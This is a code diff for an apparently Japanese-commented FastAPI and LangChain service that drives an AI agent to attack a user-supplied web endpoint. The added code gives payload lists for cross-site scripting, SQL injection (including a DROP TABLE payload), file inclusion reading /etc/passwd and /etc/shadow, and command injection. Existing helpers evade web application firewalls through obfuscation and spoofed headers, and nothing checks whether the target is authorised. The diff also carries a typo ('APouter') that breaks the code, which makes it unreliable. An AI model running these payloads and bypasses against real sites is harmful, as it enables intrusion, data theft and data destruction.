@@ -23,7 +23,7 @@ from langchain.memory import ConversationBufferMemory
 # --- FastAPIとAPIRouterのインスタンスを生成 ---
 load_dotenv()
 app = FastAPI()
-router = APIRouter()
+router = APouter()
 
 # --- WAFバイパス手法を適用するヘルパー関数 ---
 def apply_waf_bypass(payload: str, bypass_technique: str) -> str:
@@ -31,41 +31,86 @@ def apply_waf_bypass(payload: str, bypass_technique: str) -> str:
     指定されたバイパス手法をペイロードに適用する。
     """
     if bypass_technique == "case_obfuscation":
-        # 大文字小文字をランダムに変更
         return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
     elif bypass_technique == "url_encoding":
-        # ペイロード全体をURLエンコード
         return quote_plus(payload)
     elif bypass_technique == "character_substitution":
-        # 特定の文字を代替文字に置換 (例: ' ' -> '+')
         return payload.replace(" ", "+").replace("<", "%3C").replace(">", "%3E")
     elif bypass_technique == "add_null_byte":
-        # ペイロードにヌルバイトを挿入
         return payload.replace("'", "%00'")
     return payload
 
-# --- 脆弱性ペイロード生成関数 (変更なし) ---
-def generate_xss_payloads(num_payloads: int = 5) -> List[str]:
-    base_payloads = ["<script>alert('XSS')</script>","<img src=x onerror=alert('XSS')>","<svg onload=alert('XSS')>","javascript:alert('XSS');","';alert('XSS');//","<body onload='alert(\"XSS\")'>","<iframe src='javascript:alert(\"XSS\")'></iframe>","<a href='javascript:alert(\"XSS\")'>click</a>"]
-    encoded_payloads = []
-    for payload in base_payloads:
-        if random.random() < 0.3:
-            encoded_payloads.append(payload.encode('utf-8').hex())
-            encoded_payloads.append("&#" + ";&#".join([str(ord(c)) for c in payload]))
-    random_payloads = []
-    for _ in range(num_payloads):
-        random_chars = ''.join(random.choices(string.ascii_letters + string.digits + "'\"`()", k=random.randint(5, 15)))
-        payload = f"<script>alert('{random_chars}')</script>"
-        random_payloads.append(payload)
-    return base_payloads + encoded_payloads + random_payloads
-def generate_sqli_payloads(num_payloads: int = 5) -> List[str]:
-    base_payloads = ["' OR 1=1--","' UNION SELECT NULL, NULL, NULL--","' OR '1'='1'#","admin' --","admin' #","sleep(5)","benchmark(10000000,MD5(1))"]
-    blind_payloads = ["' AND 1=1--","' AND 1=2--","' OR 1=1--","' OR 1=2--","') AND ('1'='1'--","') AND ('1'='2'--"]
-    random_payloads = []
-    for _ in range(num_payloads):
-        random_payload = f"'{random.choice(['OR','AND'])} '1'='1'-- {random.randint(1, 1000)}"
-        random_payloads.append(random_payload)
-    return base_payloads + blind_payloads + random_payloads
+# --- 脆弱性ペイロード生成関数 ---
+def generate_xss_payloads() -> List[str]:
+    """
+    XSS攻撃用のより広範なペイロードリストを生成する。
+    """
+    return [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert('XSS')>",
+        "javascript:alert('XSS');",
+        "';alert('XSS');//",
+        "\"-confirm(1)-",
+        "<body onload='alert(\"XSS\")'>",
+        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+        "<a href='javascript:alert(\"XSS\")'>click</a>",
+        "<img src='#' onerror='alert(1)'>",
+        "<p>test<svg/onload=alert(1)>",
+        "<div onmousemove=alert(1)>",
+        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
+    ]
+
+def generate_sqli_payloads() -> List[str]:
+    """
+    SQLi攻撃用のより広範なペイロードリストを生成する。
+    """
+    return [
+        "' OR 1=1--",
+        "' UNION SELECT NULL, NULL, NULL--",
+        "' OR '1'='1'#",
+        "admin' --",
+        "admin' #",
+        "sleep(5)",
+        "benchmark(10000000,MD5(1))",
+        "' OR 1=2",
+        "\" OR 1=1--",
+        "1' OR '1'='1",
+        "1; DROP TABLE users;--",
+        "' AND 1=2 UNION SELECT 'A', 'B', 'C'",
+        "' WAITFOR DELAY '0:0:5'--",
+        "1' ORDER BY 1--",
+        "1' ORDER BY 10--",
+    ]
+
+def generate_lfi_payloads() -> List[str]:
+    """
+    LFI（ローカルファイルインクルージョン）攻撃用のペイロードリストを生成する。
+    """
+    return [
+        "../../../../etc/passwd",
+        "../../../../etc/shadow",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "../../../../../../../../../../../../windows/win.ini",
+        "file:///etc/passwd",
+        "/proc/self/cmdline"
+    ]
+
+def generate_rce_payloads() -> List[str]:
+    """
+    RCE（リモートコード実行）攻撃用のペイロードリストを生成する。
+    """
+    return [
+        ";ls -la;",
+        "|id|",
+        "`id`",
+        "|ping -c 4 127.0.0.1|",
+        "&&id",
+        "%26%26id",
+        ";cat /etc/passwd",
+        "() { :; }; /bin/eject",
+    ]
 
 # --- ツール定義 ---
 @tool
@@ -73,47 +118,29 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
     """
     指定されたURLにHTTPリクエストを送信し、複数のWAFバイパス手法を試行しながら脆弱性ペイロードをテストする。
     """
-    # 複数のWAFバイパス手法
     bypass_techniques = ["case_obfuscation", "url_encoding", "character_substitution", "add_null_byte"]
     
-    # 複数のWAFバイパスヘッダー
     bypass_headers_list = [
-        # 標準的なブラウザのヘッダー
         {},
-        # WAFバイパス用ヘッダー1
-        {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'X-Forwarded-For': '127.0.0.1' # ローカルIPを偽装
-        },
-        # WAFバイパス用ヘッダー2
-        {
-            'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)', # クローラーを偽装
-            'Referer': 'https://www.google.com/' # 参照元を偽装
-        }
+        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','X-Forwarded-For': '127.0.0.1'},
+        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)','Referer': 'https://www.google.com/'}
     ]
 
     async with httpx.AsyncClient() as client:
         try:
-            # 最初のペイロードでWAFの有無を確認
             initial_response = await client.request(method, url, data=data, headers=headers, timeout=15)
             
-            # WAFバイパス試行
             for technique in bypass_techniques:
                 for bypass_headers in bypass_headers_list:
-                    
-                    # ペイロードとヘッダーを組み合わせる
                     modified_data = apply_waf_bypass(data, technique) if data else None
                     combined_headers = {**(headers or {}), **bypass_headers}
 
                     try:
                         response_bypass = await client.request(method, url, data=modified_data, headers=combined_headers, timeout=15)
                         
-                        # WAFバイパスが成功したかどうかを判断
-                        # 例：元のリクエストがブロックされた（403, 406など）が、バイパス試行が成功した（200 OK）
                         if initial_response.status_code in [403, 406, 503] and response_bypass.status_code == 200:
                             return f"WAF Bypass SUCCESS with {technique} and {bypass_headers}! Original request was blocked ({initial_response.status_code}), but bypass was successful ({response_bypass.status_code}). Response Body: {response_bypass.text[:500]}"
                         
-                        # 脆弱性検出ロジック (バイパス試行の結果を分析)
                         vulnerability_flags = []
                         response = response_bypass
                         
@@ -126,7 +153,7 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
                             if modified_data and str(modified_data) in response.text:
                                 vulnerability_flags.append("XSS_PAYLOAD_REFLECTED")
 
-                        if payload_type == "path_traversal":
+                        if payload_type == "path_traversal" or payload_type == "lfi":
                             if re.search(r"root:[xX]:0:0:|c:\\windows|etc/passwd|/etc/passwd", response.text, re.IGNORECASE):
                                 vulnerability_flags.append("PATH_TRAVERSAL_CONTENT_DETECTED")
 
@@ -134,16 +161,18 @@ async def send_http_request_with_payload(url: str, method: str, payload_type: st
                             if re.search(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}", response.text):
                                 vulnerability_flags.append("SSRF_INTERNAL_IP_DETECTED")
                         
+                        if payload_type == "rce":
+                            if re.search(r"uid=\d+\(.*?\)|windows", response.text, re.IGNORECASE):
+                                vulnerability_flags.append("RCE_COMMAND_OUTPUT_DETECTED")
+
                         flags_str = " | ".join(vulnerability_flags) if vulnerability_flags else "No specific vulnerability pattern detected."
                         
                         if vulnerability_flags:
                              return f"Status Code: {response.status_code}\nFlags: {flags_str}\nResponse Body (Text): {response.text[:500]}"
                     
                     except httpx.HTTPStatusError as e:
-                        # ステータスコードがエラーでも処理を続行
                         print(f"HTTP Error during bypass attempt: {e}")
                     except Exception as e:
-                        # 他の予期せぬエラーもキャッチ
                         print(f"Unexpected error during bypass attempt: {e}")
 
             return "WAF bypass attempts failed. No vulnerabilities detected with these methods."
@@ -175,7 +204,7 @@ class ScanInput(BaseModel):
     url: str = Field(..., description="スキャン対象のベースURL")
     target_endpoint: str = Field(..., description="脆弱性をテストするエンドポイント (例: '/search.php')")
     tech_stack: Optional[List[TechStackItem]] = Field(None, description="ターゲットの技術スタック情報")
-    vulnerability_types: Optional[List[str]] = Field(["xss", "sql_injection", "path_traversal", "ssrf"], description="診断する脆弱性タイプ")
+    vulnerability_types: Optional[List[str]] = Field(["xss", "sql_injection", "path_traversal", "ssrf", "lfi", "rce"], description="診断する脆弱性タイプ")
 
 # --- APIエンドポイント ---
 @router.post("/start_scan")
@@ -207,13 +236,27 @@ async def start_scan(scan_input: ScanInput):
         memory=memory
     )
     
+    # --- 新規追加: すべてのペイロードを生成 ---
+    all_xss_payloads = generate_xss_payloads()
+    all_sqli_payloads = generate_sqli_payloads()
+    all_lfi_payloads = generate_lfi_payloads()
+    all_rce_payloads = generate_rce_payloads()
+    
+    # --- 変更: プロンプトにすべてのペイロードリストを含める ---
     tech_stack_str = ", ".join([f"{item.name} {item.version}" if item.version else item.name for item in scan_input.tech_stack]) if scan_input.tech_stack else "情報なし"
-
+    
     initial_input = f"""
     ターゲットURL: {scan_input.url}
     攻撃対象エンドポイント: {scan_input.target_endpoint}
     技術スタック: {tech_stack_str}
     診断する脆弱性タイプ: {', '.join(scan_input.vulnerability_types)}
+    
+    以下のペイロードをすべて順番に試行してください。
+    XSSペイロード: {', '.join(all_xss_payloads)}
+    SQLiペイロード: {', '.join(all_sqli_payloads)}
+    LFIペイロード: {', '.join(all_lfi_payloads)}
+    RCEペイロード: {', '.join(all_rce_payloads)}
+    
     上記情報に基づき、脆弱性スキャンを開始してください。
     """
     
